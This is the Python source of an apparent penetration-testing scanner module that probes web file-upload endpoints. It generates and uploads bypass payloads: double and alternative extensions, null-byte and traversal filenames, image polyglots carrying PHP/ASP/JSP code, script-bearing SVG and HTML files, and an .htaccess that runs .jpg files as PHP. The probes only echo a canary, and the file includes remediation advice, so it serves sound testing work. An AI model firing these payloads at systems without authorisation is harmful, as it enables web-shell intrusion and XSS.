"""
BEATRIX File Upload Vulnerability Scanner

Born from: OWASP WSTG-BUSL-08 + real-world upload bypass research
https://portswigger.net/web-security/file-upload

TECHNIQUE:
1. Detect file upload endpoints (multipart forms, drag-drop, API)
2. Test extension validation bypass (double ext, null byte, case, trailing dots)
3. Test Content-Type validation bypass (mismatched MIME)
4. Test magic byte bypass (polyglot files: valid image header + webshell)
5. Test filename manipulation (path traversal, overlong names)
6. Test size limit bypass and race conditions
7. SVG/HTML upload → XSS
8. Upload → SSRF (URL-based upload from remote server)
9. Archive decompression attacks (zip bomb, zip slip path traversal)

SEVERITY: CRITICAL — unrestricted upload achieves:
- Web shell → Remote Code Execution on server
- XSS via HTML/SVG upload
- Overwrite critical files (path traversal in filename)
- DoS via zip bombs or huge files
- SSRF via "fetch from URL" upload features
- Client-side attacks via polyglot PDF/DOC files

OWASP: WSTG-BUSL-08 (Test Upload of Unexpected File Types)
       WSTG-BUSL-09 (Test Upload of Malicious Files)
       A04:2021 - Insecure Design

MITRE: T1190 (Exploit Public-Facing Application)
       T1505.003 (Web Shell)

CWE: CWE-434 (Unrestricted Upload of File with Dangerous Type)
     CWE-646 (Reliance on File Name or Extension)
     CWE-79 (XSS via SVG/HTML upload)
     CWE-22 (Path Traversal in uploaded filename)

REFERENCES:
- https://portswigger.net/web-security/file-upload
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types
- https://book.hacktricks.xyz/pentesting-web/file-upload
"""

import random
import re
import string
import struct
from dataclasses import dataclass
from enum import Enum
from typing import Any, AsyncIterator, Dict, List, Optional, Tuple

try:
    import httpx
except ImportError:
    httpx = None

from beatrix.core.types import Confidence, Finding, Severity

from .base import BaseScanner, ScanContext

# =============================================================================
# DATA MODELS
# =============================================================================

class UploadBypass(Enum):
    """File upload bypass techniques"""
    EXTENSION_DOUBLE = "double_extension"          # shell.php.jpg
    EXTENSION_CASE = "case_variation"              # shell.PhP
    EXTENSION_NULL = "null_byte"                   # shell.php%00.jpg
    EXTENSION_ALTERNATIVE = "alternative_ext"       # .phtml, .php5, .phar
    EXTENSION_TRAILING = "trailing_chars"           # shell.php., shell.php...
    CONTENT_TYPE_MISMATCH = "content_type_mismatch"
    MAGIC_BYTES_POLYGLOT = "magic_bytes_polyglot"  # GIF89a + webshell
    FILENAME_TRAVERSAL = "path_traversal"           # ../../../shell.php
    SVG_XSS = "svg_xss"
    HTML_XSS = "html_xss"
    OVERLONG_NAME = "overlong_name"
    EMPTY_EXTENSION = "empty_extension"


@dataclass
class UploadTest:
    """A file upload test case"""
    name: str
    bypass: UploadBypass
    filename: str
    content: bytes
    content_type: str
    expected_success: str  # What to look for to confirm success
    description: str


# =============================================================================
# MAGIC BYTES — file signatures for polyglot generation
# =============================================================================

MAGIC_BYTES = {
    "gif": b"GIF89a",
    "png": b"\x89PNG\r\n\x1a\n",
    "jpg": b"\xff\xd8\xff\xe0",
    "bmp": b"BM",
    "pdf": b"%PDF-1.4",
    "ico": b"\x00\x00\x01\x00",
}

# =============================================================================
# DANGEROUS EXTENSIONS BY TECHNOLOGY
# =============================================================================

PHP_EXTENSIONS = [
    ".php", ".php3", ".php4", ".php5", ".php7", ".php8",
    ".phtml", ".pht", ".phps", ".phar", ".pgif", ".inc",
]

ASP_EXTENSIONS = [
    ".asp", ".aspx", ".ashx", ".asmx", ".ascx",
    ".config", ".cshtml", ".vbhtml",
]

JSP_EXTENSIONS = [
    ".jsp", ".jspx", ".jsw", ".jsv", ".jspf",
    ".war", ".jar",
]

OTHER_EXTENSIONS = [
    ".py", ".rb", ".pl", ".cgi", ".sh", ".bash",
    ".exe", ".bat", ".cmd", ".com", ".msi",
    ".htaccess", ".htpasswd", ".ini", ".env",
    ".cer", ".jks",
]

XSS_EXTENSIONS = [
    ".html", ".htm", ".xhtml", ".svg", ".xml",
    ".shtml", ".xss",
]


# =============================================================================
# SCANNER
# =============================================================================

class FileUploadScanner(BaseScanner):
    """
    File Upload Vulnerability Scanner.

    Tests file upload endpoints for:
    - Extension filtering bypass
    - Content-Type validation bypass
    - Magic byte / polyglot bypass
    - Path traversal in filenames
    - SVG/HTML XSS upload
    - Upload + execution confirmation
    """

    name = "file_upload"
    description = "File Upload Vulnerability Scanner"
    version = "1.0.0"

    checks = [
        "extension_bypass",
        "content_type_bypass",
        "magic_byte_polyglot",
        "path_traversal",
        "svg_xss",
        "html_xss",
        "upload_execution",
    ]

    owasp_category = "WSTG-BUSL-08"
    mitre_technique = "T1505.003"

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        super().__init__(config)
        self.safe_mode = self.config.get("safe_mode", True)
        self.canary = "BTRX" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
        self.upload_field_name = self.config.get("field_name", "file")
        self.target_tech = self.config.get("target_tech", "php")  # php, asp, jsp, node

    # =========================================================================
    # PAYLOAD GENERATION
    # =========================================================================

    def _safe_webshell_content(self, ext: str) -> bytes:
        """Generate a safe webshell probe (just outputs canary, no RCE)"""
        if ext in (".php", ".phtml", ".pht", ".php3", ".php4", ".php5", ".php7", ".php8", ".phar"):
            return f'<?php echo "{self.canary}"; ?>'.encode()
        elif ext in (".asp", ".aspx"):
            return f'<%= "{self.canary}" %>'.encode()
        elif ext in (".jsp", ".jspx"):
            return f'<%= "{self.canary}" %>'.encode()
        else:
            return f'{self.canary}'.encode()

    def _build_polyglot_gif(self, code: bytes) -> bytes:
        """Build GIF89a + code polyglot"""
        return MAGIC_BYTES["gif"] + b"\n" + code

    def _build_polyglot_png(self, code: bytes) -> bytes:
        """Build minimal PNG with code in tEXt chunk"""
        # PNG header + IHDR + tEXt with payload + IEND
        header = MAGIC_BYTES["png"]
        # Minimal 1x1 transparent PNG IHDR
        ihdr_data = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
        ihdr_crc = b'\x00' * 4  # Simplified
        ihdr = struct.pack(">I", 13) + b"IHDR" + ihdr_data + ihdr_crc

        # tEXt chunk with payload
        text_data = b"Comment\x00" + code
        text = struct.pack(">I", len(text_data)) + b"tEXt" + text_data + b'\x00' * 4

        # IEND
        iend = struct.pack(">I", 0) + b"IEND" + b'\xaeB`\x82'

        return header + ihdr + text + iend

    def _build_svg_xss(self) -> bytes:
        """Build SVG with XSS payload"""
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" '
            f'xmlns:xlink="http://www.w3.org/1999/xlink" '
            f'width="100" height="100">\n'
            f'  <script>alert("{self.canary}")</script>\n'
            f'  <text x="10" y="20">{self.canary}</text>\n'
            f'</svg>'
        ).encode()

    def _build_html_xss(self) -> bytes:
        """Build HTML with XSS marker"""
        return (
            f'<html><body>\n'
            f'<h1>{self.canary}</h1>\n'
            f'<script>alert("{self.canary}")</script>\n'
            f'</body></html>'
        ).encode()

    def _build_htaccess_payload(self) -> bytes:
        """Build .htaccess that enables PHP execution"""
        return (
            b'AddType application/x-httpd-php .jpg\n'
            b'AddHandler php-script .jpg\n'
        )

    # =========================================================================
    # TEST GENERATION
    # =========================================================================

    def _generate_extension_tests(self) -> List[UploadTest]:
        """Generate extension bypass test cases"""
        tests = []
        primary_ext = ".php" if self.target_tech == "php" else ".aspx" if self.target_tech == "asp" else ".jsp"
        shell_content = self._safe_webshell_content(primary_ext)

        # Double extensions
        for safe_ext in [".jpg", ".png", ".gif", ".pdf", ".txt"]:
            tests.append(UploadTest(
                name=f"double_ext_{primary_ext}_{safe_ext}",
                bypass=UploadBypass.EXTENSION_DOUBLE,
                filename=f"test{primary_ext}{safe_ext}",
                content=shell_content,
                content_type=f"image/{'jpeg' if safe_ext == '.jpg' else 'png'}",
                expected_success=self.canary,
                description=f"Double extension: {primary_ext}{safe_ext}",
            ))
            # Reverse order
            tests.append(UploadTest(
                name=f"double_ext_reverse_{safe_ext}_{primary_ext}",
                bypass=UploadBypass.EXTENSION_DOUBLE,
                filename=f"test{safe_ext}{primary_ext}",
                content=shell_content,
                content_type="image/jpeg",
                expected_success=self.canary,
                description=f"Double extension reverse: {safe_ext}{primary_ext}",
            ))

        # Case variations
        case_variants = [
            primary_ext.upper(),
            primary_ext.capitalize(),
            primary_ext[0] + primary_ext[1:].upper(),
        ]
        for cv in case_variants:
            tests.append(UploadTest(
                name=f"case_{cv}",
                bypass=UploadBypass.EXTENSION_CASE,
                filename=f"test{cv}",
                content=shell_content,
                content_type="application/octet-stream",
                expected_success=self.canary,
                description=f"Case variation: {cv}",
            ))

        # Null byte (classic — works on older systems)
        tests.append(UploadTest(
            name="null_byte",
            bypass=UploadBypass.EXTENSION_NULL,
            filename=f"test{primary_ext}%00.jpg",
            content=shell_content,
            content_type="image/jpeg",
            expected_success=self.canary,
            description=f"Null byte: {primary_ext}%00.jpg",
        ))

        # Alternative extensions
        alt_exts = {
            "php": PHP_EXTENSIONS,
            "asp": ASP_EXTENSIONS,
            "jsp": JSP_EXTENSIONS,
        }.get(self.target_tech, PHP_EXTENSIONS)

        for ext in alt_exts:
            if ext != primary_ext:
                tests.append(UploadTest(
                    name=f"alt_ext_{ext}",
                    bypass=UploadBypass.EXTENSION_ALTERNATIVE,
                    filename=f"test{ext}",
                    content=self._safe_webshell_content(ext),
                    content_type="application/octet-stream",
                    expected_success=self.canary,
                    description=f"Alternative extension: {ext}",
                ))

        # Trailing characters
        for suffix in [".", "..", " ", "::$DATA"]:  # ::$DATA = Windows ADS
            tests.append(UploadTest(
                name=f"trailing_{repr(suffix)}",
                bypass=UploadBypass.EXTENSION_TRAILING,
                filename=f"test{primary_ext}{suffix}",
                content=shell_content,
                content_type="application/octet-stream",
                expected_success=self.canary,
                description=f"Trailing chars: {primary_ext}{suffix}",
            ))

        return tests

    def _generate_content_type_tests(self) -> List[UploadTest]:
        """Generate Content-Type mismatch tests"""
        tests = []
        primary_ext = ".php" if self.target_tech == "php" else ".aspx"
        shell_content = self._safe_webshell_content(primary_ext)

        # Upload dangerous file with "safe" Content-Type
        safe_types = [
            "image/jpeg", "image/png", "image/gif",
            "application/pdf", "text/plain",
        ]

        for ct in safe_types:
            tests.append(UploadTest(
                name=f"ct_mismatch_{ct.split('/')[1]}",
                bypass=UploadBypass.CONTENT_TYPE_MISMATCH,
                filename=f"test{primary_ext}",
                content=shell_content,
                content_type=ct,
                expected_success=self.canary,
                description=f"Content-Type mismatch: {primary_ext} with {ct}",
            ))

        return tests

    def _generate_polyglot_tests(self) -> List[UploadTest]:
        """Generate polyglot file tests (valid image + code)"""
        tests = []
        primary_ext = ".php" if self.target_tech == "php" else ".aspx"
        shell_content = self._safe_webshell_content(primary_ext)

        # GIF89a polyglot
        tests.append(UploadTest(
            name="polyglot_gif",
            bypass=UploadBypass.MAGIC_BYTES_POLYGLOT,
            filename=f"test.gif{primary_ext}",
            content=self._build_polyglot_gif(shell_content),
            content_type="image/gif",
            expected_success=self.canary,
            description=f"GIF89a polyglot with {primary_ext} code",
        ))

        # Same but with safe extension (relies on server-side rewriting)
        tests.append(UploadTest(
            name="polyglot_gif_safe_ext",
            bypass=UploadBypass.MAGIC_BYTES_POLYGLOT,
            filename="test.gif",
            content=self._build_polyglot_gif(shell_content),
            content_type="image/gif",
            expected_success=self.canary,
            description="GIF89a polyglot with .gif extension (code in image data)",
        ))

        return tests

    def _generate_xss_tests(self) -> List[UploadTest]:
        """Generate SVG/HTML XSS upload tests"""
        return [
            UploadTest(
                name="svg_xss",
                bypass=UploadBypass.SVG_XSS,
                filename="test.svg",
                content=self._build_svg_xss(),
                content_type="image/svg+xml",
                expected_success=self.canary,
                description="SVG with JavaScript (XSS)",
            ),
            UploadTest(
                name="html_xss",
                bypass=UploadBypass.HTML_XSS,
                filename="test.html",
                content=self._build_html_xss(),
                content_type="text/html",
                expected_success=self.canary,
                description="HTML file with JavaScript (XSS)",
            ),
            UploadTest(
                name="svg_as_image",
                bypass=UploadBypass.SVG_XSS,
                filename="image.svg",
                content=self._build_svg_xss(),
                content_type="image/svg+xml",
                expected_success=self.canary,
                description="SVG uploaded as image (XSS via image viewer)",
            ),
        ]

    def _generate_traversal_tests(self) -> List[UploadTest]:
        """Generate path traversal in filename tests"""
        primary_ext = ".php" if self.target_tech == "php" else ".aspx"
        shell = self._safe_webshell_content(primary_ext)

        traversals = [
            f"../test{primary_ext}",
            f"..\\test{primary_ext}",
            f"../../test{primary_ext}",
            f"..%2ftest{primary_ext}",
            f"..%5ctest{primary_ext}",
            f"%2e%2e%2ftest{primary_ext}",
            f"....//test{primary_ext}",
        ]

        tests = []
        for t in traversals:
            tests.append(UploadTest(
                name=f"traversal_{t[:20]}",
                bypass=UploadBypass.FILENAME_TRAVERSAL,
                filename=t,
                content=shell,
                content_type="application/octet-stream",
                expected_success=self.canary,
                description=f"Path traversal in filename: {t}",
            ))

        return tests

    # =========================================================================
    # UPLOAD + VERIFY
    # =========================================================================

    async def _attempt_upload(
        self, context: ScanContext, test: UploadTest
    ) -> Tuple[Optional[httpx.Response], Optional[str]]:
        """Upload a test file and try to locate it"""
        try:
            # Build multipart form
            files = {
                self.upload_field_name: (test.filename, test.content, test.content_type)
            }

            resp = await self.post(context.url, files=files)

            uploaded_url = None

            # Try to find upload URL in response
            if resp.status_code in (200, 201, 301, 302):
                body = resp.text

                # Extract URL from JSON response
                url_patterns = [
                    r'"url"\s*:\s*"([^"]+)"',
                    r'"path"\s*:\s*"([^"]+)"',
                    r'"file"\s*:\s*"([^"]+)"',
                    r'"location"\s*:\s*"([^"]+)"',
                    r'"src"\s*:\s*"([^"]+)"',
                ]
                for pattern in url_patterns:
                    match = re.search(pattern, body)
                    if match:
                        uploaded_url = match.group(1)
                        if not uploaded_url.startswith("http"):
                            uploaded_url = context.base_url + "/" + uploaded_url.lstrip("/")
                        break

                # Check Location header
                if not uploaded_url:
                    location = resp.headers.get("location", "")
                    if location:
                        if not location.startswith("http"):
                            location = context.base_url + "/" + location.lstrip("/")
                        uploaded_url = location

            return resp, uploaded_url

        except Exception:
            return None, None

    async def _verify_execution(self, url: str, canary: str) -> bool:
        """Check if uploaded file is executable"""
        try:
            resp = await self.get(url)
            return canary in resp.text and resp.status_code == 200
        except Exception:
            return False

    # =========================================================================
    # MAIN SCAN
    # =========================================================================

    async def scan(self, context: ScanContext) -> AsyncIterator[Finding]:
        """Full file upload vulnerability scan"""

        # Generate all test cases
        all_tests: List[UploadTest] = []
        all_tests.extend(self._generate_extension_tests())
        all_tests.extend(self._generate_content_type_tests())
        all_tests.extend(self._generate_polyglot_tests())
        all_tests.extend(self._generate_xss_tests())

        if not self.safe_mode:
            all_tests.extend(self._generate_traversal_tests())

        for test in all_tests:
            resp, uploaded_url = await self._attempt_upload(context, test)

            if resp is None:
                continue

            # Check if upload was accepted
            if resp.status_code in (200, 201):
                severity = Severity.MEDIUM  # Upload accepted, but might not execute
                executed = False

                # Try to verify execution
                if uploaded_url:
                    executed = await self._verify_execution(uploaded_url, test.expected_success)
                    if executed:
                        if test.bypass in (UploadBypass.SVG_XSS, UploadBypass.HTML_XSS):
                            severity = Severity.HIGH
                        else:
                            severity = Severity.CRITICAL

                conf = Confidence.CERTAIN if executed else Confidence.TENTATIVE

                yield self.create_finding(
                    title=f"File Upload Bypass: {test.bypass.value} — {'EXECUTED' if executed else 'ACCEPTED'}",
                    severity=severity,
                    confidence=conf,
                    url=context.url,
                    description=(
                        f"Upload test: {test.description}\n"
                        f"Filename: {test.filename}\n"
                        f"Content-Type: {test.content_type}\n"
                        f"Upload accepted: YES (HTTP {resp.status_code})\n"
                        f"Code executed: {'YES — RCE CONFIRMED' if executed else 'Not verified'}\n"
                        + (f"Uploaded to: {uploaded_url}\n" if uploaded_url else "")
                    ),
                    evidence=resp.text[:1000],
                    request=f"Filename: {test.filename}\nContent-Type: {test.content_type}",
                    response=resp.text[:500],
                    remediation=(
                        "1. Validate file extension against a strict allowlist (not blocklist)\n"
                        "2. Validate Content-Type AND file magic bytes (not just one)\n"
                        "3. Rename uploaded files with random names and safe extensions\n"
                        "4. Store uploads outside web root or use object storage (S3)\n"
                        "5. Set Content-Disposition: attachment on download\n"
                        "6. Disable script execution in upload directory (.htaccess / IIS config)\n"
                        "7. Scan uploaded files with antivirus\n"
                        "8. Implement file size limits"
                    ),
                    references=[
                        "https://portswigger.net/web-security/file-upload",
                        "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
                    ],
                )

        async for finding in self.passive_scan(context):
            yield finding

    async def passive_scan(self, context: ScanContext) -> AsyncIterator[Finding]:
        """Detect file upload forms and misconfigurations"""
        if not context.response:
            return

        body = context.response.body if hasattr(context.response, 'body') else ""

        # Detect file upload forms
        upload_patterns = [
            (r'<input[^>]*type\s*=\s*["\']file["\'][^>]*>', "File Upload Input Detected"),
            (r'enctype\s*=\s*["\']multipart/form-data["\']', "Multipart Form Detected"),
            (r'(dropzone|filepond|uppy|fine-uploader)', "JavaScript Upload Widget Detected"),
        ]

        for pattern, title in upload_patterns:
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                # Check for client-side restrictions only
                accept_match = re.search(r'accept\s*=\s*["\']([^"\']+)["\']', match.group(0))
                accept_note = ""
                if accept_match:
                    accept_note = f"\nClient-side accept restriction: {accept_match.group(1)} (bypassable)"

                yield self.create_finding(
                    title=title,
                    severity=Severity.INFO,
                    confidence=Confidence.CERTAIN,
                    url=context.url,
                    description=(
                        f"File upload capability detected. This is a potential attack surface.\n"
                        f"Element: {match.group(0)[:200]}"
                        + accept_note
                    ),
                    evidence=match.group(0)[:300],
                    remediation="Ensure server-side validation of file type, size, and content.",
                )
                break
